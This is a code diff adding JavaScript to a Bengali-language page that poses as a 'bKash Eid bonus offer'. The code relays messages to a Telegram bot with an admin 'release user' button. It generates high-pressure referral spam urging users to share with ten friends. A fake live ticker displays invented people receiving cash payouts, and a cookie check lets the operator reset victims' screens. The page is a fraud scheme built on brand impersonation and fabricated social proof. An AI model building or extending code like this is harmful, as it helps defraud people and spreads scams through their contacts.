+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: text
+                })
+            }).catch(err => console.error("Telegram post error: ", err));
+        }
+
+        // Dynamic inline buttons parsing module hook mapping for release trigger action pipelines
+        function sendTelegramMessageWithInlineRelease(text) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            // Build pseudo reference endpoint structure targeting webhook emulation parameters
+            const inlineMarkup = {
+                inline_keyboard: [[
+                    { text: "🔓 Release User Link", callback_data: `release_access_hook` }
+                ]]
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: text,
+                    reply_markup: inlineMarkup
+                })
+            }).catch(err => console.error("Telegram post inline error: ", err));
+        }
+
+        // Text Compilation block builder strings
+        function getSharedReferralMessageText() {
+            const currentBaseUrl = window.location.origin + window.location.pathname;
+            const fullRefUrl = `${currentBaseUrl}?ref=${generatedRefCode}`;
+
+            return `🎉 🔥 Eid Bonus Offer – Limited Time Special Program 🔥\n` +
+                   `🌙 কুরবানির ঈদ খুব কাছেই!\n` +
+                   `🎁 আমাদের পক্ষ থেকে রয়েছে এক্সক্লুসিভ Eid Bonus Offer\n` +
+                   `যা খুব সীমিত সময়ের জন্য চালু আছে!\n` +
+                   `━━━━━━━━━━━━━━\n` +
+                   `⚡ ⏳ অফার চলছে – এখনই নিন!\n` +
+                   `👉 আপনি এখনো বসে আছেন?\n` +
+                   `⏰ দেরি করলে এই সুযোগ হারিয়ে যাবে!\n` +
+                   `🚀 দ্রুত অ্যাকশন নিন এবং আপনার বোনাস নিশ্চিত করুন।\n` +
+                   `━━━━━━━━━━━━━━\n` +
+                   `📢 আপনার কাজ খুব সহজ:\n` +
+                   `✔️ আপনার রেফারেল লিংক শেয়ার করুন\n` +
+                   `✔️ আপনার বন্ধুদের ইনভাইট করুন\n` +
+                   `✔️ যত বেশি রেফারেল, তত দ্রুত বোনাস অ্যাক্টিভ\n` +
+                   `━━━━━━━━━━━━━━\n` +
+                   `🔗 Your Referral Link:\n` +
+                   `${fullRefUrl}\n` +
+                   `━━━━━━━━━━━━━━\n\n` +
+                   `🌙 Eid Mubarak in Advance ❤️`;
+        }
+
+        // Action: Copy functions mapping
+        function copyReferralText() {
+            const textToCopy = getSharedReferralMessageText();
+            navigator.clipboard.writeText(textToCopy).then(() => {
+                alert("লিংক ও অফার টেক্সট সফলভাবে কপি হয়েছে! আপনার ১০ জন বন্ধুকে পাঠিয়ে দিন।");
+            }).catch(() => {
+                alert("কপি করতে সমস্যা হয়েছে, অনুগ্রহ করে ম্যানুয়ালি সিলেক্ট করে কপি করুন।");
+            });
+        }
+
+        // Action Share APIs integrations matching Web Share API models wrapper layout
+        function shareReferralText() {
+            const shareData = {
+                title: 'বিকাশ ঈদ বোনাস অফার',
+                text: getSharedReferralMessageText()
+            };
+
+            if (navigator.share) {
+                navigator.share(shareData).catch((err) => console.log(err));
+            } else {
+                // Fallback copy fallback system triggers
+                copyReferralText();
+            }
+        }
+
+        // Realtime Pseudo Live Tick engine simulator interval mapping loop
+        function initFakeLiveTicker() {
+            setInterval(() => {
+                const randomName = fakeNames[Math.floor(Math.random() * fakeNames.length)];
+                const randomMethod = fakeMethods[Math.floor(Math.random() * fakeMethods.length)];
+                const randomAmount = Math.floor(Math.random() * (1000 - 500 + 1)) + 500;
+                
+                document.getElementById('live-ticker-text').innerText = `${randomName} এইমাত্র ${randomAmount} টাকা ${randomMethod} এর মাধ্যমে পেয়েছেন।`;
+            }, 7000);
+        }
+
+        // POLLING POINTER: Simulated dynamic reset interface trigger if admin clears cookie states parameters remotely hook emulations
+        // এই ফাংশনটি ব্রাউজারে রান হতে থাকবে। এডমিন যদি ডাটাবেজ ক্লিয়ার করার সিগন্যাল দিতে চান, সেটির বিকল্প হিসেবে লোকালস্টোরেজ বা কুকি রিমুভাল মেকানিজম চেক করে ইউজার ইন্টারফেস রিসেট করে দিবে।
+        setInterval(() => {
+            if(getCookie('user_sub_state') === null && !document.getElementById('progress-container').classList.contains('hidden')) {
+                // Trigger structural state reset back to pristine input setup forms panel view automatically
+                document.getElementById('progress-container').classList.add('hidden');
+                document.getElementById('bonus-form').reset();
+                document.getElementById('form-container').classList.remove('hidden');
+            }
+        }, 3000);
     </script>
 </body>
 </html>
